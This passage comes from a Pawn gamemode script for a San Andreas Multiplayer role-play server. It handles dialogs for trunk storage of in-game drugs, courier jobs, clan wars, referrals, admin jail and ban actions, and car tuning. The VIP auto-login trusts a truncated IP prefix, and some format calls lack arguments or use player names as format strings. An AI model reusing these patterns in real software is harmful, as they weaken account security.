			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}
	}	
	if(dialogid == DIALOG_PORTBAGAJ+9)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			if(IsNumeric(inputtext))
			{
				new suma = strval(inputtext);
				if(suma < 1 || suma > 50000)
				{
					SCM(playerid, COLOR_ERROR, "You can withdraw up 50,000g and at least 1g Drug.");
					format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to withdraw the drug from the trunk of your vehicle.\n\n{0066FF}current drug:{FFFFFF} %dg\n\n(!) To withdraw drugs enter the desired amount and click 'Confirm'.");
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+9, DIALOG_STYLE_INPUT, "Add drugs", MGLOBAL, "Confirm", "CANCEL");
					return 1;
				}
				if(CarInfo[idv][vDroguri] >= suma)
				{
					CarInfo[idv][vDroguri] -= suma;
					PlayerInfo[playerid][pDrugs] += suma;
					format(MGLOBAL, sizeof(MGLOBAL), "you retired %sg drug in your trunk.",FormatNumber(suma));
					SCM(playerid, COLOR_SERVER, MGLOBAL);
					new str[1000];
					mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Drugs`='%d' WHERE `id`='%d'",PlayerInfo[playerid][pDrugs],PlayerInfo[playerid][pSQLID]);
					mysql_tquery(SQL,str,"","");
					vUpdate(idv, cPortbagaj);
				}
				else
				{
					SCM(playerid, COLOR_ERROR, "It does not have so many drugs in the trunk.");
					format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to withdraw the drug from the trunk of your vehicle.\n\n{0066FF}current drug:{FFFFFF} %dg\n\n(!) To withdraw drugs enter the desired amount and click 'Confirm'.");
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+9, DIALOG_STYLE_INPUT, "Add drugs", MGLOBAL, "Confirm", "CANCEL");
				}
			}
			else
			{
				SCM(playerid, COLOR_ERROR, "Puteti introduce doar cifre!");
				format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}Sunteti pe cale sa retrageti droguri din portbagajul vehiculului dvs.\n\n{0066FF}current drug:{FFFFFF} %dg\n\n(!) To withdraw drugs enter the desired amount and click 'Confirm'.");
				ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+9, DIALOG_STYLE_INPUT, "Add drugs", MGLOBAL, "Confirm", "CANCEL");
			}
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}
	}	
	if(dialogid == DIALOG_PORTBAGAJ+8)
	{
		new vid = PortbagajVID[playerid];
		new idv = OwnedVeh(vid);
		if(response)
		{
			if(IsNumeric(inputtext))
			{
				new suma = strval(inputtext);
				if(suma <= 50000 && suma > 0) 
				{
					if(CarInfo[idv][vDroguri] + suma <= 50000)
					{
						if(PlayerInfo[playerid][pDrugs] >= suma)
						{
							CarInfo[idv][vDroguri] += suma;
							PlayerInfo[playerid][pDrugs] -= suma;
							new str[1000];
							format(MGLOBAL, sizeof(MGLOBAL), "you took %sg drug in your trunk.",FormatNumber(suma));
							SCM(playerid, COLOR_SERVER, MGLOBAL);
							mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Drugs`='%d' WHERE `id`='%d'",PlayerInfo[playerid][pDrugs],PlayerInfo[playerid][pSQLID]);
							mysql_tquery(SQL,str,"","");
							vUpdate(idv, cPortbagaj);
						}
						else 
						{
							SCM(playerid, COLOR_ERROR, "You have so many grams of drugs.");
							format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add drugs in the trunk of your vehicle.\n\n{0066FF}current drug:{FFFFFF} %sg\n\n(!) To submit drugs enter the desired amount and click 'Confirm'.",FormatNumber(CarInfo[idv][vDroguri]));
							ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+8, DIALOG_STYLE_INPUT, "Add drugs", MGLOBAL, "Confirm", "CANCEL");
						}
					}
					else 
					{
						SCM(playerid, COLOR_ERROR, "You can submit up to 50,000g and at least 1g of drugs in your luggage.");
						format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add drugs in the trunk of your vehicle.\n\n{0066FF}current drug:{FFFFFF} %sg\n\n(!) To submit drugs enter the desired amount and click 'Confirm'.",FormatNumber(CarInfo[idv][vDroguri]));
						ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+8, DIALOG_STYLE_INPUT, "Add drugs", MGLOBAL, "Confirm", "CANCEL");
					}
				}
				else 
				{
					SCM(playerid, COLOR_ERROR, "You can submit up to 50,000g drug.");
					format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add drugs in the trunk of your vehicle.\n\n{0066FF}current drug:{FFFFFF} %sg\n\n(!) To submit drugs enter the desired amount and click 'Confirm'.",FormatNumber(CarInfo[idv][vDroguri]));
					ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+8, DIALOG_STYLE_INPUT, "Add drugs", MGLOBAL, "Confirm", "CANCEL");
				}
			}
			else
			{
				SCM(playerid, COLOR_ERROR, "You can enter only numbers!");
				format(MGLOBAL, sizeof(MGLOBAL), "{FFFFFF}You are about to add drugs in the trunk of your vehicle.\n\n{0066FF}current drug:{FFFFFF} %sg\n\n(!) To submit drugs enter the desired amount and click 'Confirm'.",FormatNumber(CarInfo[idv][vDroguri]));
				ShowPlayerDialog(playerid, DIALOG_PORTBAGAJ+8, DIALOG_STYLE_INPUT, "Add drugs", MGLOBAL, "Confirm", "CANCEL");
			}
		}
		else
		{
			new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(vid, engine, lights, alarm, doors, bonnet, boot, objective);
			SetVehicleParamsEx(vid, VEHICLE_PARAMS_ON, lights, alarm, doors, bonnet, 0, objective);
		}
	}	
	if(dialogid == DIALOG_CURIER)
	{
		if(response)
		{
			CP[playerid] = 151515;
			if(JCurier[playerid][3] > 6) JCurier[playerid][3] = 1;
			if(JCurier[playerid][3] == 1) SetPlayerCheckpoint(playerid, 1352.3694,-1753.3938,13.4537, 4.0); // cp1
			if(JCurier[playerid][3] == 2) SetPlayerCheckpoint(playerid, 2122.4026,-1769.8047,13.4902, 4.0); // cp2
			if(JCurier[playerid][3] == 3) SetPlayerCheckpoint(playerid, 2622.3555,1130.2948,10.9141, 4.0); // cp3
			if(JCurier[playerid][3] == 4) SetPlayerCheckpoint(playerid, 2185.4146,2010.0812,10.9138, 4.0); // cp4
			if(JCurier[playerid][3] == 5) SetPlayerCheckpoint(playerid, 1826.5072,-1843.0140,13.5854, 4.0); // cp5
			if(JCurier[playerid][3] == 6) SetPlayerCheckpoint(playerid, 995.9887,-915.3770,42.2735, 4.0); // cp6
		}
		else
		{
			if(JCurier[playerid][0] > 0)
			{
				JCurier[playerid][3] = 0;
				if(JCurier[playerid][1] > 0)
				{
					DisableRemoteVehicleCollisions(playerid, 0);
				}
				DestroyVehicle(JCurier[playerid][2]);
				JCurier[playerid][0] = -1;
				JCurier[playerid][1] = -1;
				JCurier[playerid][2] = -1;
				SCM(playerid, COLOR_ERROR, "You refused to continue to work!");
				DisablePlayerCheckpoint(playerid);
			}
		}
	}
	if(dialogid == DIALOG_DBONUS)
	{
		for(new i = 0; i < sizeof(DailyTD); i++) PlayerTextDrawHide(playerid, DailyTD[i]);
	}
	if(dialogid == DIALOG_CASATORIE)
	{
		if(response)
		{
			new id = invitatiecasatorie[playerid];
			if(IsPlayerConnected(id))
			{
				format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Popa' TopZone: {FFFFFF}%S and %s were married! Stone house!",PlayerInfo[playerid][pNormalName],PlayerInfo[id][pNormalName]);
				SendClientMessageToAll(COLOR_SERVER, MGLOBAL);
				PlayerInfo[playerid][pCasatorit] = PlayerInfo[id][pSQLID];
				PlayerInfo[id][pCasatorit] = PlayerInfo[playerid][pSQLID];
				Update(playerid, pCasatoritx);
				Update(id, pCasatoritx);
			}
			else return SCM(playerid, COLOR_ERROR, "That player is offline.");
		}
		else
		{
			new id = invitatiecasatorie[playerid];
			if(IsPlayerConnected(id))
			{
				format(MGLOBAL, sizeof(MGLOBAL), "%s refusing marriage proposal",PlayerInfo[playerid][pNormalName]);
				SCM(playerid, -1, MGLOBAL);
				SCM(playerid, -1, "You refused a marriage proposal.");
			}
			else return SCM(playerid, COLOR_ERROR, "That player is offline.");
		}
	}
	if(dialogid == DIALOG_CLANWAR)
	{
		if(response)
		{
			if(invitatiecattack[invitatiecattack[playerid]] == playerid)
			{
				new id = invitatiecattack[playerid];
				new cid = PlayerInfo[playerid][pClan];
				new idc = PlayerInfo[id][pClan];
				ClanWar[cid][cClanTime] = 300;
				ClanWar[cid][cClanAttacker] = idc;
				ClanWar[idc][cClanAttacker] = cid;
				format(MGLOBAL, sizeof(MGLOBAL), "(Co-)Leader Clan %s - %s He accepted your invitation to war.",ClanInfo[cid][cClanName], PlayerInfo[playerid][pNormalName]);
				SCM(id, COLOR_SERVER, MGLOBAL);
				new hp1 = 0,hp2 = 0;
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i))
					{
						if(PlayerInfo[i][pClan] == cid)
						{
							SetPlayerPos(i, -974.0880,1060.9220,1345.6759);
							SetPlayerInterior(i, 10);
							SetPlayerVirtualWorld(i, idc+cid);
							incwar[i] = cid;
							mortcwar[i] = 0; 
							SetPlayerHealthEx(i, 100.00);
							hp1 += 100;
							format(MGLOBAL, sizeof(MGLOBAL), "%s_VS__%s",ClanInfo[cid][cClanTag],ClanInfo[idc][cClanTag]);
							PlayerTextDrawSetString(i, CWarTD[2], MGLOBAL);
							format(MGLOBAL, sizeof(MGLOBAL), "%s_CLAN_HP:_%d",ClanInfo[cid][cClanTag],hp1);
							PlayerTextDrawSetString(i, CWarTD[3], MGLOBAL);
							format(MGLOBAL, sizeof(MGLOBAL), "%s_CLAN_HP:_%d",ClanInfo[idc][cClanTag],hp2);
							PlayerTextDrawSetString(i, CWarTD[4], MGLOBAL);
							format(MGLOBAL, sizeof(MGLOBAL), "CLAN_WAR_TIME:_%s",CalculeazaTimp2(ClanWar[cid][cClanTime]));
							PlayerTextDrawSetString(i, CWarTD[5], MGLOBAL);
							for(new x = 0; x < sizeof(CWarTD); x++) PlayerTextDrawShow(i, CWarTD[x]);
							if(ClanInfo[cid][cClanScor] >= 0)
							{
								GivePlayerWeaponEx(i, 24, 999);
								if(ClanInfo[cid][cClanScor] >= 3) GivePlayerWeaponEx(i, 25, 999);
								if(ClanInfo[cid][cClanScor] >= 6) GivePlayerWeaponEx(i, 28, 999);
								if(ClanInfo[cid][cClanScor] >= 9) GivePlayerWeaponEx(i, 29, 999);
								if(ClanInfo[cid][cClanScor] >= 12) GivePlayerWeaponEx(i, 30, 999);
								if(ClanInfo[cid][cClanScor] >= 20) GivePlayerWeaponEx(i, 31, 999);
								if(ClanInfo[cid][cClanScor] >= 30) GivePlayerWeaponEx(i, 32, 999);
							}
						}
						if(PlayerInfo[i][pClan] == idc)
						{
							SetPlayerPos(i, -1130.9023,1057.6205,1346.4175);
							SetPlayerInterior(i, 10);
							SetPlayerVirtualWorld(i, idc+cid);
							incwar[i] = idc;
							SetPlayerColor(i, 0x9092D4FF);
							mortcwar[i] = 0; 
							SetPlayerHealthEx(i, 100.00);
							hp2 += 100;
							format(MGLOBAL, sizeof(MGLOBAL), "%s_VS__%s",ClanInfo[cid][cClanTag],ClanInfo[idc][cClanTag]);
							PlayerTextDrawSetString(i, CWarTD[2], MGLOBAL);
							format(MGLOBAL, sizeof(MGLOBAL), "%s_CLAN_HP:_%d",ClanInfo[cid][cClanTag],hp1);
							PlayerTextDrawSetString(i, CWarTD[3], MGLOBAL);
							format(MGLOBAL, sizeof(MGLOBAL), "%s_CLAN_HP:_%d",ClanInfo[idc][cClanTag],hp2);
							PlayerTextDrawSetString(i, CWarTD[4], MGLOBAL);
							format(MGLOBAL, sizeof(MGLOBAL), "CLAN_WAR_TIME:_%s",CalculeazaTimp2(ClanWar[cid][cClanTime]));
							PlayerTextDrawSetString(i, CWarTD[5], MGLOBAL);
							for(new x = 0; x < sizeof(CWarTD); x++) PlayerTextDrawShow(i, CWarTD[x]);
							if(ClanInfo[idc][cClanScor] >= 0)
							{
								GivePlayerWeaponEx(i, 24, 999);
								if(ClanInfo[idc][cClanScor] >= 3) GivePlayerWeaponEx(i, 25, 999);
								if(ClanInfo[idc][cClanScor] >= 6) GivePlayerWeaponEx(i, 28, 999);
								if(ClanInfo[idc][cClanScor] >= 9) GivePlayerWeaponEx(i, 29, 999);
								if(ClanInfo[idc][cClanScor] >= 12) GivePlayerWeaponEx(i, 30, 999);
								if(ClanInfo[idc][cClanScor] >= 20) GivePlayerWeaponEx(i, 31, 999);
								if(ClanInfo[idc][cClanScor] >= 30) GivePlayerWeaponEx(i, 32, 999);
							}
						}
					}
				}
				
			}
			else return SCM(playerid, COLOR_ERROR, "Offer that player is no longer valid.");
		}
	}
	if(dialogid == DIALOG_CLANUPGRADE+1)
	{
		if(response)
		{
			new hour,minn,sec;
			gettime(hour,minn,sec);
			if(hour >= 10 && hour <= 16)
			{
				new id = PlayerInfo[playerid][pClan];
				ClanInfo[id][cClanVerificat] = 2;
				new stringyy[512];
				mysql_format(SQL, stringyy, sizeof(stringyy), "UPDATE `clans` SET `ClanVerificat`='2' WHERE `clanID`='%d'",id);
				mysql_tquery(SQL, stringyy, "", "");
				mysql_format(SQL,stringyy, sizeof(stringyy), "UPDATE `users` SET `VerificareClan`='1' WHERE `Clan`='%d'", id);
				mysql_tquery(SQL,stringyy,"","");
				mysql_format(SQL,stringyy, sizeof(stringyy), "UPDATE `clans` SET `Conectari` = '0' WHERE `clanID` = '%d'",id);
				mysql_tquery(SQL,stringyy,"","");
				ShowPlayerDialog(playerid, DIALOG_CLANUPGRADE, DIALOG_STYLE_MSGBOX, "Checking clan", "Clan is now on the list of verification server.\n20:00 verification will be completed and you will receive an answer.", "OK", "");
			}
			else return SCM(playerid, COLOR_ERROR, "Checking a Clan can only be done between the hours 10:00 - 16:00.");
		}
	}
	if(dialogid == DIALOG_REFERRAL+1)
	{
		if(!response) return 1;
		if(response)
		{
			new sqlcheck[1000];
			mysql_format(SQL, sqlcheck, sizeof(sqlcheck), "SELECT * FROM `users` WHERE `ID`='%d'",PlayerInfo[playerid][pSQLID]);
			new Cache: rezultate = mysql_query(SQL, sqlcheck);
			for(new i, j = cache_get_row_count(); i != j; i++)
			{
				rpreff[playerid] = cache_get_field_content_int(i, "RPReff");
				ppreff[playerid] = cache_get_field_content_int(i, "PPReff");
				banireff[playerid] = cache_get_field_content_int(i, "BaniReff");
			}
			cache_delete(rezultate);
			mysql_format(SQL, sqlcheck, sizeof(sqlcheck), "SELECT * FROM `users` WHERE `Referral`='%d'",PlayerInfo[playerid][pSQLID]);
			new Cache: rezultat = mysql_query(SQL, sqlcheck);
			cache_delete(rezultat);
			format(MGLOBAL, sizeof(MGLOBAL), "Item\tSuma\nCollect money\t%s\nCollect points of respect\t%s\nCollect the Premium Points\t%s",
			FormatNumber(banireff[playerid]),FormatNumber(rpreff[playerid]),FormatNumber(ppreff[playerid]));
			ShowPlayerDialog(playerid, DIALOG_REFERRAL+2, DIALOG_STYLE_TABLIST_HEADERS, "Menu Referral System.", MGLOBAL, "Selects the", "CANCEL");
		}
	}
	if(dialogid == DIALOG_REFERRAL+2)
	{
		if(!response) return 1;
		if(response)
		{
			if(listitem == 0)
			{
				new sqlcheck[1000];
				new msg[1000];	
				if(banireff[playerid] == 0) return SCM(playerid, COLOR_ERROR, "No money collected.");
				GivePlayerCash(playerid, banireff[playerid]);
				Update(playerid, pCashx);
				format(msg, sizeof(msg), "Ai colectat $%s de la referrali.",FormatNumber(banireff[playerid]));
				mysql_format(SQL, sqlcheck, sizeof(sqlcheck), "UPDATE `users` SET `BaniReff`='0' WHERE `ID`='%d'",PlayerInfo[playerid][pSQLID]);
				mysql_tquery(SQL, sqlcheck, "", "");
				ShowPlayerDialog(playerid, DIALOG_REFERRAL+3, DIALOG_STYLE_MSGBOX, "Collection", msg, "OK", "");
			}
			if(listitem == 1)
			{
				new sqlcheck[1000];
				new msg[1000];	
				if(rpreff[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You have to collect points Respect.");
				format(msg, sizeof(msg), "have collected %s Respect points from referrals.",FormatNumber(rpreff[playerid]));
				PlayerInfo[playerid][pExp] += rpreff[playerid];
				Update(playerid, pRP);
				mysql_format(SQL, sqlcheck, sizeof(sqlcheck), "UPDATE `users` SET `RPReff`='0' WHERE `ID`='%d'",PlayerInfo[playerid][pSQLID]);
				mysql_tquery(SQL, sqlcheck, "", "");
				ShowPlayerDialog(playerid, DIALOG_REFERRAL+3, DIALOG_STYLE_MSGBOX, "Collection", msg, "OK", "");
			}
			if(listitem == 2)
			{
				new sqlcheck[1000];
				new msg[1000];	
				if(ppreff[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You have to collect Premium Points.");
				format(msg, sizeof(msg), "have collected %s Premium Points from referrals.",FormatNumber(ppreff[playerid]));
				PlayerInfo[playerid][pPremiumPoints] += ppreff[playerid];
				Update(playerid, pPremiumPointsx);
				mysql_format(SQL, sqlcheck, sizeof(sqlcheck), "UPDATE `users` SET `PPReff`='0' WHERE `ID`='%d'",PlayerInfo[playerid][pSQLID]);
				mysql_tquery(SQL, sqlcheck, "", "");
				ShowPlayerDialog(playerid, DIALOG_REFERRAL+3, DIALOG_STYLE_MSGBOX, "Collection", msg, "OK", "");
			}
		}
	}	
	if(dialogid == DIALOG_REFERRAL)
	{
		if(!response) return 1;
		if(response)
		{
			new cont = MySQLCheckAccount(inputtext);
	        if(cont == 0) return SCM(playerid,COLOR_ERROR,"That player is not registered in the database."),
			ShowPlayerDialog(playerid, DIALOG_REFERRAL, DIALOG_STYLE_INPUT, "SERVER: Referral", "You brought someone in this community?\nIf so, enter the name of the player you brought and click 'Continue'.\nIf you were not brought one server, press 'CANCEL'.", "Continue", "CANCEL");
			if(cont == PlayerInfo[playerid][pSQLID]) return SCM(playerid,COLOR_ERROR,"You can not add yourself to the referral."),
			ShowPlayerDialog(playerid, DIALOG_REFERRAL, DIALOG_STYLE_INPUT, "SERVER: Referral", "You brought someone in this community?\nIf so, enter the name of the player you brought and click 'Continue'.\nIf you were not brought one server, press 'CANCEL'.", "Continue", "CANCEL");
			format(MGLOBAL, sizeof(MGLOBAL), "{0066FF}Referral: {FFFFFF}You are part of the list of {0066FF}%s {FFFFFF}invitations.",inputtext);
			SCM(playerid, COLOR_SERVER, MGLOBAL);
			PlayerInfo[playerid][pReferral] = cont;
			Update(playerid, pReferralx);
		}
	}
	if(dialogid == DIALOG_VIPLOGIN)
	{
		if(response)
		{
			new sqlupdate[1000];
			new ip[16];
			GetPlayerIp(playerid, ip, 16);
			new clasaip[64];
			strdel(ip, 8, strlen(ip));
			format(clasaip, sizeof(clasaip), "%s",ip);
			mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `logareautomata`='1',`clasaIP`='%s' WHERE `id`='%d'",clasaip,PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, sqlupdate, "", "");
			SCM(playerid, -1, "Option for automatic login has been activated.");
		}
		else
		{
			new sqlupdate[1000];
			mysql_format(SQL, sqlupdate, sizeof(sqlupdate), "UPDATE `users` SET `logareautomata`='0' WHERE `id`='%d'",PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, sqlupdate, "", "");
			SCM(playerid, -1, "option for automatic login has expired");
		}
	}
	if(dialogid == DIALOG_SpecConfirmare)
	{
		if(!response) return 1;
		if(PlayerInfo[playerid][pAdmin] > 0)
		{
			new id = Spectate[playerid];
			new giveplayer[30];
			if(IsPlayerConnected(id))
			{
				if(PlayerInfo[id][pJailTime] > 0) return SCM(playerid,COLOR_ERROR,"That player is already in jail.");
				format(giveplayer, sizeof(giveplayer), PlayerInfo[id][pNormalName]);
				format(sendername, sizeof(sendername), PlayerInfo[playerid][pNormalName]);
				ResetPlayerWeaponsEx(id);
				ResetPlayerWeapons(id);
				WantedPoints[id] = 0;
				PlayerInfo[id][pJailed] = 2;
				PlayerInfo[id][pJailTime] = 10*60;
				JailPrice[id] = 0;
				SetPlayerInterior(id, 10);
                new rand;
				rand = random(sizeof(gRandomAJailSpawns));
				SetPlayerPosEx(id,gRandomAJailSpawns[rand][0],gRandomAJailSpawns[rand][1],gRandomAJailSpawns[rand][2]);
				format(string, sizeof(string), "{FF6347}Jail: %s was jailed by %s for %d minutes, reason: %s.", giveplayer, sendername,10,"DM / DB");
				SendClientMessageToAll(COLOR_ERROR, string);
				new var100[256];
				mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`reason`,`playername`,`givername`) VALUES ('%d','%d','6','DM / DB','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],giveplayer,sendername);
				mysql_tquery(SQL,var100,"","");
			    format(string,sizeof(string),"Log: %s the set of %s set jail time 10 minutes reason: DM / DB",sendername,giveplayer);
		        Adminlog(string);
		        Update(id,pJailedx);
				Update(id,pJailTimex);
			}
			else return SCM(playerid, COLOR_ERROR, "That player is offline.");
		}
	}
	if(dialogid == DIALOG_SpecConfirmare+1)
	{
		if(!response) return 1;
		if(PlayerInfo[playerid][pAdmin] > 0)
		{
			new id = Spectate[playerid];
			if(IsPlayerConnected(id))
			{
				new giveplayer[30],reason[30],playerip[16];
				new year,month,day;
				new hour,minute,second;
				new days = 7;
				new str[1400],time;
				getdate(year, month, day);
			    gettime(hour, minute, second);
				format(reason, sizeof(reason), "Cheats");
       			format(giveplayer, sizeof(giveplayer), PlayerInfo[id][pNormalName]);
				format(sendername, sizeof(sendername), PlayerInfo[playerid][pNormalName]);
				GetPlayerIp(id, playerip, sizeof(playerip));
				if(PlayerInfo[id][pAdmin] >= PlayerInfo[playerid][pAdmin]) return SendClientMessage(playerid, COLOR_GREY, "Nu poti face asta.");
				if(days > 0)
				{
					time = gettime() + (days*86400);
				    format(string,sizeof(string),"{FF6347}Ban: %s has been banned by %s for %d days, reason: %s",giveplayer,sendername,days,reason);
				    SendClientMessageToAll(COLOR_ERROR, string);
				    mysql_format(SQL,str,sizeof(str),"INSERT INTO bans (PlayerName, AdminName, Reason, IP, Days, IPBan, Permanent, Active, Time) VALUES('%s', '%s', '%s', '%s', %d, 0, 0, 1, %d)",
					PlayerInfo[id][pNormalName],PlayerInfo[playerid][pNormalName],reason,playerip,days,time);
					mysql_tquery(SQL,str,"","");
					new var100[256];
	    			mysql_format(SQL, var100, sizeof(var100), "INSERT INTO punishlogs (`playerid`,`giverid`,`actionid`,`actiontime`,`reason`,`playername`,`givername`) VALUES ('%d','%d','2','%d','%s','%s','%s')", PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID],days,reason,giveplayer,sendername);
					mysql_tquery(SQL,var100,"","");
					KickEx(id);
				}
			}
		}
	}	
	if(dialogid == DIALOG_MOTOR)
	{
		if(!response) return 1;
		if(GetPlayerCash(playerid) >= 10000000)
		{
			GivePlayerCash(playerid, -10000000);
			CarInfo[OwnedVeh(GetPlayerVehicleID(playerid))][cNewEngine] = 1;
			vUpdate(OwnedVeh(GetPlayerVehicleID(playerid)), cNewEnginex);
			SCM(playerid, COLOR_SERVER, "Congratulations! You bought a new engine for your vehicle, now it is stronger!");
		}
		else return SCM(playerid, COLOR_ERROR, "You do not have enough money.");
	}
	if(dialogid == DIALOG_SPOILERE)
	{
		if(!response) return 1;
		switch(listitem)
		{
					case 0: 
					{
						TPInfo[ playerid ][ tID ] = -1;
	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) 
						{
			                if( cTInfo[ i ][ cType ] == CARMODTYPE_FRONT_BUMPER ) 
							{
			                    if( cTInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cTInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SCM(playerid, -1, "No parts compatible with your vehicle");

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_FRONT_BUMPER;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDControl( playerid, true );

	                    format( globalstring, sizeof( globalstring ), "%s", cTInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cTInfo[ cid ][ cID ] );

						SelectTextDraw( playerid, 0xFF000000);
						//|----------camera din fata----------|
						InterpolateCameraPos(playerid, 268.983154, -175.870849, 1073.296752, 260.771148, -166.982559, 1071.866210, 3000);
						InterpolateCameraLookAt(playerid, 265.597778, -172.630737, 1071.552978, 264.244964, -170.180847, 1070.221923, 3000);
	                }
	                case 1: 
					{ 
						TPInfo[ playerid ][ tID ] = -1;
	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cTInfo[ i ][ cType ] == CARMODTYPE_REAR_BUMPER ) {
			                    if( cTInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cTInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SCM(playerid, -1, "No parts compatible with your vehicle");

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_REAR_BUMPER;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDControl( playerid, true );

	                    format( globalstring, sizeof( globalstring ), "%s", cTInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cTInfo[ cid ][ cID ] );

						SelectTextDraw( playerid, 0xFF000000);
						//|----------cameradinspate----------|
						InterpolateCameraPos(playerid, 265.925750, -167.007904, 1071.765258, 261.750823, -175.495254, 1071.980346, 3000);
						InterpolateCameraLookAt(playerid, 262.974700, -170.593673, 1069.912231, 263.993316, -171.593124, 1069.802124, 3000);
	                }
	                case 2: 
					{
						TPInfo[ playerid ][ tID ] = -1;
	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cTInfo[ i ][ cType ] == CARMODTYPE_ROOF ) {
			                    if( cTInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cTInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SCM(playerid, -1, "No parts compatible with your vehicle");

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_ROOF;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDControl( playerid, true );

	                    format( globalstring, sizeof( globalstring ), "%s", cTInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cTInfo[ cid ][ cID ] );

						SelectTextDraw( playerid, 0xFF000000);
						//|----------camera de la roof----------|
						InterpolateCameraPos(playerid, 266.065185, -167.244201, 1071.713867, 263.458740, -168.153381, 1072.270874, 3000);
						InterpolateCameraLookAt(playerid, 262.211181, -169.840209, 1069.867919, 263.624786, -172.390136, 1069.620849, 3000);
	                }
	                case 3: 
					{
	                    TPInfo[ playerid ][ tID ] = -1;
	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cTInfo[ i ][ cType ] == CARMODTYPE_SPOILER ) {
			                    if( cTInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cTInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SCM(playerid, -1, "No parts compatible with your vehicle");

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_SPOILER;
						TPInfo[ playerid ][ tPaintjob ] = false;
	                
	                    TogglePlayerControllable( playerid, false );
	                    TuningTDControl( playerid, true );
	                
	                    format( globalstring, sizeof( globalstring ), "%s", cTInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cTInfo[ cid ][ cID ] );
						
						SelectTextDraw( playerid, 0xFF000000);
						//|----------cameradinspate----------|
						InterpolateCameraPos(playerid, 265.925750, -167.007904, 1071.765258, 261.750823, -175.495254, 1071.980346, 3000);
						InterpolateCameraLookAt(playerid, 262.974700, -170.593673, 1069.912231, 263.993316, -171.593124, 1069.802124, 3000);
	                }
	                case 4: 
					{
						TPInfo[ playerid ][ tID ] = -1;
	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cTInfo[ i ][ cType ] == CARMODTYPE_SIDESKIRT ) {
			                    if( cTInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cTInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SCM(playerid, -1, "No parts compatible with your vehicle");

